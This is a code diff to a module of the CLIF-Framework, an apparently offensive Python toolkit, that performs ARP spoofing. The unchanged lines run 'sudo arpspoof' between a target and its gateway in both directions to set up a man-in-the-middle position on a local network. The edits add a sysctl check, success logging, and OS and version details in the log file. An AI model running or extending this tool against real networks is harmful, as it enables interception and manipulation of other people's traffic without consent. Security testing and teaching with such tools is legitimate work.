@@ -5,7 +5,8 @@
 # The CLIF-Framework is programmed and developed by Taguar258.
 # The CLIF-Framework is published under the MIT Licence.
 
-from os import getcwd, path, popen, system
+from os import getcwd, name, path, popen, system
+from sys import version
 from threading import Thread
 from time import sleep
 
@@ -69,6 +70,12 @@ class Main:
 
 		if "/" not in popen("command -v arpspoof").read():
 			input("\n[i] Please install DSniff to continue.\n[Press Enter to continue]")
+			system("clear || cls")
+			var.stop()
+			return
+
+		if "/" not in popen("command -v sysctl").read():
+			input("\n[i] Sysctl does not exist, this attack will not work.\n[Press Enter to continue]")
 			system("clear || cls")
 			var.stop()
 			return
@@ -209,6 +216,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def arp_target(self):
 		try:
 			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.target, var.gateway))
+			var.command_log.append("Sucessful execution.")
 		except Exception as ex:
 			var.command_log.append("ERROR: %s" % ex)
 			print("ERROR: %s" % ex)
@@ -216,6 +224,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def arp_router(self):
 		try:
 			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.gateway, var.target))
+			var.command_log.append("Sucessful execution.")
 		except Exception as ex:
 			var.command_log.append("ERROR: %s" % ex)
 			print("ERROR: %s" % ex)
@@ -268,7 +277,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					output_file = open(output_to, write_method)
 					if write_method == "a":
 						output_file.write("------------- New Log -------------")
-					output_file.write(str(var.command_log))
+					output_file.write(str(name + "\n"))
+					output_file.write(str(version + "\n"))
+					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
 				print("Done.")
 				quit()
